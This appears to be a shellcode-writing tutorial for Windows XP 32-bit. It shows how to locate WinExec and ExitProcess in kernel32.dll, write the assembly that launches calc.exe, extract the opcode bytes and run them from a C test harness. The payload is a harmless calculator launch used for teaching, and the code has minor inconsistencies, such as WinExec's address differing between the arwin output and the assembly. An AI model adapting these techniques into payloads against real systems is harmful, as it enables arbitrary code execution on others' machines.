## Enviornment Setup
+ [See this post to setup your windows xp enviornment](/_posts/2019-10-20-Win32=Env.md)

## WinExec() function from kernel32.dll
+ [WinExec function - Microsoft Documentation](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec?redirectedfrom=MSDN)
+ the `kernel32.dll` Dynamically Linking Library is loaded into all windows xp programs
+ The `WinExec()` function within `kernel32.dll` can be used to launch any program that the user running the process can access  
+ Use `WinExec()` from `kernel32.dll` to launch any program on a windows computer.
  - Similar to `Execve()` in linux

```c
UINT WinExec(LPCSTR lpCmdLine, UINT uCmdShow);
//  lpCmdLine = path to application to be executed
//  uCmdShow  = Display options
```

### lpCmdLine Parameter
+ If the lpCmdLine variable does not include the full path to the application, then the path is determined in this order:

1. The directory from which the application loaded.
2. The current directory.
3. The Windows system directory.
  - The `GetSystemDirectory` function retrieves the path of this directory.
4. The Windows directory.
  - The `GetWindowsDirectory` function retrieves the path of this directory.
5. The directories listed in the `PATH` environment variable.

### uCmdShow Parameter
```c
SW-SHOWNORMAL = 0x00000001 
```

+ An application should specify this flag when displaying the window for the first time. 

### Find WinExec & ExitProcess Address's within kernel32.dll
```console
C:\arwin.exe
arwin - win32 address resolution program - by steve hanna - v.01
Usage: arwin.exe <Library Name> <Function Name>
C:\arwin.exe kernel32.dll WinExec
WinExec is located at 0x738623ad in kernel32.dll
C:\arwin.exe kernel32.dll ExitProcess
ExitProcess is located at 0x7c81cafa in kernel32.dll
```
+ The `ExitProcess` function within `kernel32.dll` is used to gracefully close the host process after the calc.exe process is launched using the `WinExec` function.

![](/assets/images/arwin-findWinExec.png)
+ Arwin is case sensitive for the `<Function Name>` parameter.

### Creating the Shellcode Assembly

#### Push to Stack Little Endian
##### reverse.py source code
```python
#!/usr/bin/python
import sys
input = sys.argv[1]
print 'String length : ' +str(len(input))
stringList = [input[i:i+4] for i in range(0, len(input), 4)]
for item in stringList[::-1] :
        print item[::-1] + ' : ' + str(item[::-1].encode('hex'))
```
+ Python program from Vivek's SLAE32 course at Penteser Academy.
  - Best course for Linux 32-bit Shellcoding.

#### calc.exe to Little Endian
```console
root@kali# python reverse.py "calc.exe"
String length : 8
exe. : 6578652e
clac : 636c6163
```
+ Intel 32 bit processor's store data on the Stack in Little Endian
+ To put something in Little Endian format, just put the hex of the bytes in as reverse

##### execCalc.asm
```nasm
; UINT WinExec( LPCSTR lpCmdLine, UINT uCmdShow );
;  WinExec() = 0x7c8623ad    # kernel32.dll on WinXP SP3
;  lpCmdLine = "calc.exe"    # String to program path
;  uCmdShow  = 0x00000001    # SW_SHOWNORMAL - displays a window
    xor ecx, ecx          ; clear eax register
    push ecx              ; string terminator 0x00 for "calc.exe" string
    push 0x6578652e       ; exe. : 6578652e
    push 0x636c6163       ; clac : 636c6163
    mov eax, esp          ; save pointer to "calc.exe" string in ebx
    inc ecx               ; uCmdShow SW_SHOWNORMAL - 0x00000001
    push ecx              ; uCmdShow *ptr to stack in 2nd position - LIFO
    push eax              ; lpcmdLine *ptr to stack in 1st position
    mov ebx, 0x7c8623ad   ; call WinExec() function addr in kernel32.dll
    call ebx              ; win32 does not support call to address
; ExitProcess is located at 0x7c81cafa in kernel32.dll
    xor eax, eax          ; clear the eax register
    push eax              ; push a null
    mov eax, 0x7c81cafa   ; ExitProcess Address
    jmp eax               ; Execute the ExitProcess function
```

##### Compile Assembly to Object File
```console
root@kali# nasm -v 
NASM version 2.14.02 
root@kali# nasm -f elf32 execCalc.asm -o execCalc.o
```
+ Shellcode was created and compiled on x64 Kali Host
+ Compiling as a linux 32 ELF file oddly yielded the best results for Windows 32-bit shellcode.
  - Should not matter since we are only using nasm to translate the opcodes for us so we do not have to do it by hand.

##### Extract the Shellcode Hex from the Object File
```console
root@kali# for i in $(objdump -D execCalc.o | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe0\x41\x51\x50\xbb\xad\x23\x86\x7c\xff\xd3\x31\xc0\x50\xb8\xfa\xca\x81\x7c\xff\xe0
```

##### Testing the Shellcode on Windows XP 32-bit
```c
char code[] = \
"\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89"
"\xe0\x41\x51\x50\xbb\xad\x23\x86\x7c\xff\xd3\x31\xc0\x50"
"\xb8\xfa\xca\x81\x7c\xff\xe0";
int main(int argc, char **argv)
{
  int (*func)();
  func = (int(*)()) code;
  (int)(*func)();
}
```

+ Compile with lcc-win32.

##### Test Shellcode Execution
![](/assets/images/execCalc.png)
+ The host program gracefully closes using the `ExitProcess` function at the end of our Shellcode.
+ The calculator process runs even after the host process dies because it is it's own process.
+ Without the `ExitProcess` function, the calculator successfully launches, but the host process returns a windows exception / error.
